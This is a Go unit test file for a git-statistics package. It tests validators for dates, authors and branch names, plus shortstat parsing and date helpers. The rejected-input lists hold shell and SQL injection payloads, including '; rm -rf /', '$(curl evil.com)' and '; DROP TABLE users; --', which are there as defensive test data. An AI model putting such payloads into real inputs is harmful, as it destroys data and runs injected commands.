package stats

import (
	"strings"
	"testing"
)

func TestValidateDate_Valid(t *testing.T) {
	dates := []string{
		"2024-01-01",
		"2024-12-31",
		"2026-02-28",
		"2024-02-29", // leap year
	}
	for _, d := range dates {
		if err := ValidateDate(d); err != nil {
			t.Errorf("ValidateDate(%s) = %v, want nil", d, err)
		}
	}
}

func TestValidateDate_Invalid(t *testing.T) {
	dates := []string{
		"",
		"2024-13-01",
		"2024-00-01",
		"2024-01-32",
		"2024/01/01",
		"01-01-2024",
		"not-a-date",
		"2024-1-1",
		"; rm -rf /",
		"$(curl evil.com)",
		"`id`",
		"' OR '1'='1",
		"2024-01-01\\nrm -rf /",
		"0000-00-00",
	}
	for _, d := range dates {
		if err := ValidateDate(d); err == nil {
			t.Errorf("ValidateDate(%s) should have returned error", d)
		}
	}
}

func TestValidateAuthor_Valid(t *testing.T) {
	authors := []string{
		"",
		"John Doe",
		"user@example.com",
		"firstname.lastname",
		"user-name_123",
	}
	for _, a := range authors {
		if err := ValidateAuthor(a); err != nil {
			t.Errorf("ValidateAuthor(%s) = %v, want nil", a, err)
		}
	}
}

func TestValidateAuthor_Invalid(t *testing.T) {
	authors := []string{
		"$(curl evil.com)",
		"`id`",
		"'; DROP TABLE users; --",
		"\n",
		"\t",
	}
	for _, a := range authors {
		if err := ValidateAuthor(a); err == nil {
			t.Errorf("ValidateAuthor(%s) should have returned error", a)
		}
	}
}

func TestIsSafeRefName_Valid(t *testing.T) {
	refs := []string{
		"main",
		"feature/my-feature",
		"release/v1.0.0",
		"hotfix/bug-123_fix",
		"develop",
	}
	for _, r := range refs {
		if !isSafeRefName(r) {
			t.Errorf("isSafeRefName(%s) = false, want true", r)
		}
	}
}

func TestIsSafeRefName_Invalid(t *testing.T) {
	refs := []string{
		"",
		strings.Repeat("a", 300),
		"$(curl evil.com)",
		"`whoami`",
		"'; rm -rf /",
		"\n",
		"\t",
	}
	for _, r := range refs {
		if isSafeRefName(r) {
			t.Errorf("isSafeRefName(%s) = true, want false", r)
		}
	}
}

func TestParseShortStat(t *testing.T) {
	input := `
a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
 3 files changed, 15 insertions(+), 7 deletions(-)
fedcba0987654321fedcba0987654321fedcba09
 1 file changed, 100 insertions(+)
aabbccddeeff00112233445566778899aabbccdd
 2 files changed, 0 insertions(+), 50 deletions(-)
`
	result, err := parseShortStat(input)
	if err != nil {
		t.Fatalf("parseShortStat error: %v", err)
	}
	if result.FilesChanged != 6 {
		t.Errorf("FilesChanged = %d, want 6", result.FilesChanged)
	}
	if result.LinesAdded != 115 {
		t.Errorf("LinesAdded = %d, want 115", result.LinesAdded)
	}
	if result.LinesDeleted != 57 {
		t.Errorf("LinesDeleted = %d, want 57", result.LinesDeleted)
	}
}

func TestParseShortStat_Empty(t *testing.T) {
	result, err := parseShortStat("")
	if err != nil {
		t.Fatalf("parseShortStat error: %v", err)
	}
	if result.FilesChanged != 0 || result.LinesAdded != 0 || result.LinesDeleted != 0 {
		t.Error("parseShortStat should return zero Result for empty input")
	}
}

func TestGetTodayDate(t *testing.T) {
	date := GetTodayDate()
	if err := ValidateDate(date); err != nil {
		t.Errorf("GetTodayDate returned invalid date: %s", date)
	}
}

func TestGetYesterdayDate(t *testing.T) {
	date := GetYesterdayDate()
	if err := ValidateDate(date); err != nil {
		t.Errorf("GetYesterdayDate returned invalid date: %s", date)
	}
}

func TestIsWorkday(t *testing.T) {
	// Monday 2024-01-01
	if !IsWorkday("2024-01-01") {
		t.Error("Monday should be a workday")
	}
	// Saturday 2024-01-06
	if IsWorkday("2024-01-06") {
		t.Error("Saturday should not be a workday")
	}
	// Sunday 2024-01-07
	if IsWorkday("2024-01-07") {
		t.Error("Sunday should not be a workday")
	}
}
